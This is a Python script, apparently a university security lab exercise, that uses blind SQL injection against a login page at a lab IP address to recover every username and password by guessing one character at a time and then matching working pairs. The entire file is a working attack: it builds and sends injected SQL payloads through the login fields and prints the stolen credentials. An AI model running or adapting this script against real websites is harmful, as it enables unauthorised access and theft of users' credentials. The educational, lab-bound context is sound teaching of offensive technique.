#!/usr/bin/python3

#With the exception of the get_answers function which was written by Professor Bill Stackpole
#This program was written by Nicholas Graca njg7716@rit.edu.
#Given a website that uses a SQL database to authenticate users, it will brute force its way to
#get the usernames and passwords for all the users.
#In this case, I knew that the max length for usernames was 7 characters and it was 8 chars for passwords.
#To get the users, it will get a set of characters for each index, from there it will cycle through
#all the combinations until it works. The passwords are gotten a little differently. It gets all the 
#chars in the first index and then it gets one list of all the other chars. It then cycles through
#adding one char at a time, sees if its correct and if it is, it'll add it back to the list and 
#check the next letter
import requests
from string import ascii_letters
from string import digits
import code
from urllib.request import urlopen
from bs4 import BeautifulSoup
from bs4 import Comment
import sys, getopt

MAX_FIELD_LENGTH = 24
def get_answer(params):
    r = requests.post('http://192.168.203.205/blind/login.php', data=params)
    bsObj = BeautifulSoup(r.text, "lxml")
    if bsObj.find('div', {'class':'message'}).text == "You are successfully authenticated!":
        return True
    else:
        return False

def main():
    #a list of all chars that it can be. Even numbers
    chars = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
    #A list for each index in the username
    first = []
    second = []
    third = []
    fourth = []
    fifth = []
    sixth = []
    seventh = []
#Loop through and get every char and add it to the list that corresponds to its position in the username
    for ch in chars:
        params = {'userName': "' or length(userName)>0 and substring(userName, 1, 1)=" + '\"' + ch + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            first.append(ch)

        params = {'userName': "' or length(userName)>1 and substring(userName, 2, 1)=" + '\"' + ch + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            second.append(ch)
        
        params = {'userName': "' or length(userName)>2 and substring(userName, 3, 1)=" + '\"' + ch + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            third.append(ch)
        
        params = {'userName': "' or length(userName)>3 and substring(userName, 4, 1)=" + '\"' + ch + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            fourth.append(ch)
        
        params = {'userName': "' or length(userName)>4 and substring(userName, 5, 1)=" + '\"' + ch + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            fifth.append(ch)
        
        params = {'userName': "' or length(userName)>5 and substring(userName, 6, 1)=" + '\"' + ch + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            sixth.append(ch)
        
        params = {'userName': "' or length(userName)>6 and substring(userName, 7, 1)=" + '\"' + ch + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            seventh.append(ch)
    done = []
    #once all of the characters for each spot have been gotten, check every combination
    #This does not take that long since I narrowed down what it could possibly be for each index
    for a in first:
        params = {'userName': "' or userName =" + '\"' + a + '\"' + " -- '", 'password': ''}
        if get_answer(params):
            done.append(a)
        for b in second:
            user = a+b
            params = {'userName': "' or userName=" + '\"' + user + '\"' + " -- '", 'password': ''}
            if get_answer(params):
                done.append(user)
            for c in third:
                user = a+b+c
                params = {'userName': "' or userName=" + '\"' + user +  '\"' + " -- '", 'password': ''}
                if get_answer(params):
                    done.append(user)
                for d in fourth:
                    user = a+b+c+d
                    params = {'userName': "' or userName=" + '\"' + user +'\"' + " -- '", 'password': ''}
                    if get_answer(params):
                        done.append(user)
                    for e in fifth:
                        user = a+b+c+d+e
                        params = {'userName': "' or userName=" + '\"' + user + '\"' + " -- '", 'password': ''}
                        if get_answer(params):
                            done.append(user)
                        for f in sixth:
                            user = a+b+c+d+e+f
                            params = {'userName': "' or userName=" + '\"' + user + '\"' + " -- '", 'password': ''}
                            if get_answer(params):
                                done.append(user)
                            for g in seventh:
                                user = a+b+c+d+e+f+g
                                params = {'userName': "' or userName=" + '\"' + user + '\"' + " -- '", 'password': ''}
                                if get_answer(params):
                                    done.append(user)
    print("The users are: " + str(done))

    #Resets the list so it can be used for passwords
    first = []
    master = []
    #Get all the chars in the first spot and then regaurdless of where it is from the password, add it to the master list
    for ch in chars:
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 1,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            first.append(ch)
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 2,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            master.append(ch)
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 3,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            master.append(ch)
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 4,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            master.append(ch)
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 5,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            master.append(ch)
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 6,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            master.append(ch)
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 7,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            master.append(ch)
        params = {'userName': '', 'password': "' or length(password)>0 and substring(password, 8,1)=" + '\"' + ch + '\"' + " -- '"}
        if get_answer(params):
            master.append(ch)

    alsoDone = []               #a list of complete passwords
    master = set(master)        #gets rid of duplicates to save time
    leg = 9                     #the length of the longest password + 1
    #loop through each index
    for i in range(2, leg):
        for a in first:         #loop through all the partial passwords
            for ch in master:   #a loop for all the possible chars
                params = {'username': '', 'password': "' or length(password)=" + str(i) + " and substring(password, 1, " + str(i) + ")=" + '\"' + a + ch + '\"' + " -- '"}
                if get_answer(params):  #if this is true then the password is complete and you can stop
                    alsoDone.append(a+ch)

                params = {'username': '', 'password': "' or length(password)!="+ str(i) + " and substring(password, 1, " + str(i) + ")=" + '\"' + a + ch + '\"' + " -- '"}
                if get_answer(params):  #if true then the set of chars is a partial password so add it back to the list to get the next char
                    first.append(a+ch)

    print("The passwords are: " + str(alsoDone))

    #cycles through the users and passwords that we got and sees which ones correspond to eachother
    for user in done:
        for password in alsoDone:
            params = {'userName': '' + str(user), 'password': '' + str(password)}
            if get_answer(params):
                print(str(user) + " : " + str(password))

main()
